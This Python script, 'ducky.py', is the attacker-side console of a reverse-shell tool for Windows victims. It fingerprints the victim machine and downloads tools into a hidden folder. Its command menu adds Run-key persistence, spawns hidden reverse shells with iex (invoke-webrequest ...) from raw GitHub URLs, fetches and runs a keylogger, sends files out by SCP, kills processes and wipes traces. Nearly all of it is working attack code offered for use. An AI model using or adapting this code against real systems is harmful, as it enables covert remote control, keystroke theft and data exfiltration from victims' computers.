#!/usr/bin/python3
# ducky.py
# Ashish D'Souza
# January 6th, 2019
import socket
import threading
import os
import sys
from getpass import getpass
from time import sleep

port = 8008 if len(sys.argv) == 1 else int(sys.argv[1])
timeout = False

stop = False


def recv(conn):
    while not stop:
        print(conn.recv(1024).decode(), end="")
    print()


if "-ip" in sys.argv:
    attacker_ip = sys.argv[sys.argv.index("-ip") + 1]
else:
    if sys.platform[:5] == "linux" or sys.platform == "darwin":
        attacker_ip = os.popen("ip route").readlines()[1].strip().split("src ")[1].split(" ")[0]
    elif sys.platform == "win32":
        attacker_ip = os.popen("ipconfig").readlines()[0].strip().split(": ")[1]
    else:
        print("ERROR: Operating system not compatible, unable to fetch attacker IP Address.")
        attacker_ip = input("Manual entry is required >> ")
if "-ssh" in sys.argv:
    ssh_address = sys.argv[sys.argv.index("-ssh") + 1]
else:
    ssh_address = input("SSH Server Address >> ")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
if timeout:
    s.settimeout(31)
s.bind(("", port))
s.listen(5)
print("[-] Waiting for connection...")
conn, addr = s.accept()
if timeout:
    s.settimeout(None)
print("[+] Connected to victim (" + str(addr[0]) + ":" + str(addr[1]) + ")")
print("[+] Reverse shell attack successful!")
print("[+] Retrieved victim information:")
conn.send("$env:USERNAME\n".encode())
username = conn.recv(1024).decode().split("\n")[0]
print("Username:              " + username)
conn.send("$env:COMPUTERNAME\n".encode())
hostname = conn.recv(1024).decode().split("\n")[0]
print("Hostname:              " + hostname)
ip = str(addr[0])
print("IP Address:            " + ip)
port = str(addr[1])
print("Port:                  " + port)
conn.send("getmac | findstr Device | foreach-object{$_.split(\" \")[0]}\n".encode())
mac = conn.recv(1024).decode().split("\n")[0]
print("MAC Address:           " + mac)
conn.send("netsh wlan show network | findstr SSID | foreach-object{$_.split(\" \")[3]}\n".encode())
network = conn.recv(1024).decode().split("\n")[0]
print("Network:               " + network)
conn.send("$pid\n".encode())
pid = conn.recv(1024).decode().split("\n")[0]
print("Powershell PID:        " + pid)
conn.send("([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\")\n".encode())
elevation = conn.recv(1024).decode().split("\n")[0]
print("Elevated Powershell:   " + elevation)
conn.send("$env:OS\n".encode())
operating_system = conn.recv(1024).decode()
print("Operating System:      " + operating_system, end="")
operating_system = operating_system.split("\n")[0]
conn.send("cd $env:userprofile/Documents; rm -r z; mkdir z; attrib +h z; cd z; df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/pscp.exe\" \"$env:userprofile/Documents/z/pscp.exe\"; cd $env:userprofile".encode())
conn.recv(1024)
threading.Thread(target=recv, args=(conn,)).start()
last = ""
while not stop:
    stdin = input()
    if pid in stdin:
        choice = input("[!] Are you sure you want to kill this Powershell process? Y/N >> ")
        if choice.lower()[0] != "y":
            stdin = ""
            print("[-] Aborted.")
    if "!!" in stdin:
        stdin = stdin.replace("!!", last)
    if "\!" in stdin:
        stdin = stdin.replace("\!", "!")
    if stdin.lower()[:6] == "ducky/":
        ducky_command = stdin[6:]
        if ducky_command[:4] == "help":
            print("Custom Ducky Commands\n")
            print("Usage: ducky/[command] [options]\n")
            print("Command              Options      Description")
            print("ducky/help           N/A          Show this help screen")
            print("ducky/clear          N/A          Clear the terminal screen")
            print("ducky/quit           -s           Leave a signature before exiting")
            print("                     -p           Permanently exit, kill the Powershell process")
            print("ducky/info           -a           Show all")
            print("                     -u           Show username")
            print("                     -h           Show hostname")
            print("                     -ip          Show IP address")
            print("                     -port        Show port")
            print("                     -m           Show MAC address")
            print("                     -n           Show network name")
            print("                     -pid         Show Powershell PID")
            print("                     -e           Show Powershell elevation status")
            print("                     -os          Show operating system")
            print("ducky/persistence    N/A          Set up a persistent shell")
            print("                     -d           Delete the persistent shell")
            print("ducky/reverse_shell  [ip:port]    Set up a custom reverse shell")
            print("ducky/upload         [file]       Upload a file to attacker machine using SCP")
            print("ducky/rickroll       N/A          Prank the victim with a rickroll")
            print("ducky/keylogger      [timeout]    Execute a keylogger, leave blank for indefinite")
            print("ducky/capslock       N/A          Prank the victim with a toggling caps lock")
            print("ducky/escape         N/A          Prank the victim with a toggling escape key")
            print("ducky/cdrom          N/A          Eject the cdrom drive")
            print("ducky/iter           [#] {code}   Run the powershell code a specified # of times")
            print("ducky/killall        [process]    Kill all processes with this name")
            print("ducky/cdromloop      N/A          Prank the victim with a continuously ejecting cdrom drive")
            print("ducky/quackimage     N/A          Prank the victim by opening a \"you just got quacked\" image")
            print("ducky/lock           N/A          Lock the victim's computer")
            print("ducky/simpsons       N/A          Prank the victim with Bart Simpson's lock message")
            print("ducky/cleanup        N/A          Cleanup footprint, leave no traces")
            stdin = ""
        elif ducky_command[:4] == "quit":
            options = [x for x in ducky_command.split(" ")[1:] if x]
            commands = []
            if "-s" in options:
                commands.append("signature")
            if "-p" in options:
                commands.append("taskkill /f /pid $pid")
            stdin = "; ".join(commands)
            stop = True
        elif ducky_command[:5] == "clear":
            if sys.platform[:5] == "linux" or sys.platform == "darwin":
                os.system("clear")
            elif sys.platform == "win32":
                os.system("cls")
            else:
                print("ERROR: Operating system not compatible, unable to clear screen.")
            stdin = ""
        elif ducky_command[:4] == "info":
            options = [x for x in ducky_command.split(" ")[1:] if x]
            if "-u" in options or "-a" in options:
                print("Username:               " + username)
            if "-h" in options or "-a" in options:
                print("Hostname:               " + hostname)
            if "-ip" in options or "-a" in options:
                print("IP Address:             " + ip)
            if "-port" in options or "-a" in options:
                print("Port:                   " + port)
            if "-m" in options or "-a" in options:
                print("MAC Address:            " + mac)
            if "-n" in options or "-a" in options:
                print("Network:                " + network)
            if "-pid" in options or "-a" in options:
                print("Powershell PID:         " + pid)
            if "-e" in options or "-a" in options:
                print("Elevated Powershell:    " + elevation)
            if "-os" in options or "-a" in options:
                print("Operating System:       " + operating_system)
            stdin = ""
        elif ducky_command[:11] == "persistence":
            options = [x for x in ducky_command.split(" ")[1:] if x]
            commands = []
            if "-d" in options:
                commands.append("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Persistence\" /f")
                commands.append("rm $env:userprofile/Documents/z/persistence.bat")
            else:
                commands.append("df \"https://raw.githubusercontent.com/computer-geek64/ducky/master/persistence.bat\" \"$env:userprofile\\Documents\\z\\persistence.bat\"")
                commands.append("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Persistence\" /d \"$env:userprofile\\Documents\\z\\persistence.bat\" /t REG_SZ")
            stdin = "; ".join(commands)
        elif ducky_command[:13] == "reverse_shell":
            options = [x for x in ducky_command.split(" ")[1:] if x]
            input_attacker_ip = options[0].split(":")[0]
            input_attacker_port = options[0].split(":")[1]
            if input_attacker_ip.lower() == "localhost" or input_attacker_ip == "127.0.0.1":
                input_attacker_ip = attacker_ip
            commands = []
            commands.append("start-process powershell -argument \'-windowstyle hidden -command $ip=\\\"" + input_attacker_ip + "\\\"; $port=" + input_attacker_port + "; iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/reverse_shell.ps1).content\'")
            stdin = "; ".join(commands)
        elif ducky_command[:6] == "upload":
            filename = ducky_command[7:]
            commands = []
            commands.append("echo y | & $env:userprofile/Documents/z/pscp.exe -P " + ssh_address.split(":")[1] + " -pw '" + getpass("Password >> ") + "' -scp " + filename + " " + os.popen("whoami").read().strip() + "@" + ssh_address.split(":")[0] + ":" + os.getcwd() + "/scp")
            stdin = "; ".join(commands)
        elif ducky_command[:8] == "rickroll":
            commands = []
            commands.append("1..50 | % {(new-object -comobject wscript.shell).sendkeys([char]175)}")
            commands.append("start-process \"https://www.youtube.com/watch?v=oHg5SJYRHA0\"")
            stdin = "; ".join(commands)
        elif ducky_command[:9] == "keylogger":
            options = [x for x in ducky_command.split(" ")[1:] if x]
            commands = []
            commands.append("iex (ds \"https://raw.githubusercontent.com/computer-geek64/ducky/master/keylogger.ps1\")")
            if len(options) > 0:
                commands.append("get-keystrokes -timeout " + options[0] + " -logpath $env:userprofile\\Documents\\key.log")
            else:
                commands.append("get-keystrokes -logpath $env:userprofile\\Documents\\key.log")
            stdin = "; ".join(commands)
        elif ducky_command[:8] == "capslock":
            commands = []
            commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/capslock).content\'")
            stdin = "; ".join(commands)
        elif ducky_command[:6] == "escape":
            commands = []
            commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/escape).content\'")
            stdin = "; ".join(commands)
        elif ducky_command[:5] == "cdrom":
            commands = []
            commands.append("(new-object -com \"WMPlayer.OCX.7\").cdromcollection.item(0).eject()")
            stdin = "; ".join(commands)
        elif ducky_command[:4] == "iter":
            options = [x for x in ducky_command.split(" ")[1:] if x]
            powershell_code = " ".join(options[1:])
            commands = []
            if options[0] == "0":
                commands.append("while($true)" + powershell_code)
            else:
                commands.append("1.." + options[0] + " | % " + powershell_code)
            stdin = "; ".join(commands)
        elif ducky_command[:7] == "killall":
            options = [x for x in ducky_command.split(" ")[1:] if x]
            commands = []
            commands.append("tasklist | findstr /i " + options[0] + " | findstr /v $pid | foreach-object{taskkill /f /pid $_.replace(\"     \",\" \").replace(\"    \",\" \").replace(\"   \",\" \").replace(\"  \",\" \").split(\" \")[1]}")
            stdin = "; ".join(commands)
        elif ducky_command[:9] == "cdromloop":
            commands = []
            commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/cdrom).content\'")
            stdin = "; ".join(commands)
        elif ducky_command[:10] == "quackimage":
            commands = []
            commands.append("start-process \"https://raw.githubusercontent.com/computer-geek64/ducky/master/quacked.jpg\"")
            stdin = "; ".join(commands)
        elif ducky_command[:4] == "lock":
            commands = []
            commands.append("rundll32.exe user32.dll, LockWorkStation")
            stdin = "; ".join(commands)
        elif ducky_command[:8] == "simpsons":
            commands = []
            commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/simpsons).content\'")
            stdin = "; ".join(commands)
        elif ducky_command[:7] == "cleanup":
            commands = []
            commands.append("attrib -h $env:userprofile/Documents/z")
            commands.append("rm -r $env:userprofile/Documents/z")
            commands.append("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Persistence\" /f")
            stdin = "; ".join(commands)
        else:
            print("Ducky command not recognized: \"" + ducky_command + "\"")
            stdin = ""
    elif stdin.startswith("k ") and stdin[2] != "\"":
        stdin = "k \"" + stdin[2:] + "\""
    last = stdin
    conn.send((stdin + "\n").encode())
s.close()
